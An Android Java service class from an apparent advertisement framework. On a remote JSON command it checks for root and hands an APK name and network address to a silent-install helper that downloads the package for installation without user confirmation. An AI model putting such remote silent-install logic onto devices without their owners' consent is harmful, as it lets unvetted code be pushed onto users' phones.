package www.howard.com.advertisement.service.impl;

import android.content.Context;
import android.content.pm.PackageInfo;
import android.os.Handler;
import android.widget.Toast;

import org.json.JSONObject;

import www.howard.com.advertisement.helper.FrameworkStringUtils;
import www.howard.com.advertisement.helper.SystemParameterUtils;
import www.howard.com.advertisement.install.SilentInstall;
import www.howard.com.advertisement.service.ILogicalProcessingService;

/**
 * Created by majie on 2017/4/24.
 */

public class SilentInstallLogicalProcessingServiceImpl implements ILogicalProcessingService {
    @Override
    public void executionLogic(JSONObject paramDto, Context context, Handler handler) throws Exception {
        Toast.makeText(context, "安装新App", Toast.LENGTH_SHORT).show();
        /**
         * 判断有没有root权限
         */
        if (SystemParameterUtils.isRoot()) {
            String apkName = FrameworkStringUtils.asString(paramDto.get("apkName"));
            String apkNetworkAddress = FrameworkStringUtils.asString(paramDto.get("apkNetworkAddress"));
            String versionCode = FrameworkStringUtils.asString(paramDto.get("versionCode"));
            String versionName = FrameworkStringUtils.asString(paramDto.get("versionName"));
            String applicationPackageName = FrameworkStringUtils.asString(paramDto.get("applicationPackageName"));
            /**
             * 判断apk的名称和下载地址是否存在
             */
            if (!"".equals(apkName) && !"".equals(apkNetworkAddress)) {
                downLoadApkToInstall(context, apkName, apkNetworkAddress, handler);

            }
        }
    }

    private boolean isPkgInstalled(Context context, String pkgName) {
        PackageInfo packageInfo = null;
        try {
            packageInfo = context.getPackageManager().getPackageInfo(pkgName, 0);
        } catch (Exception e) {
            packageInfo = null;
            e.printStackTrace();
        }
        if (packageInfo == null) {
            return false;
        } else {
            return true;
        }
    }
    private void downLoadApkToInstall(Context context, String apkName, String apkNetworkAddress, Handler handle) throws Exception {
        SilentInstall silentInstall = new SilentInstall();
        silentInstall.downloadApk(context,apkNetworkAddress, apkName, handle);
    }
}
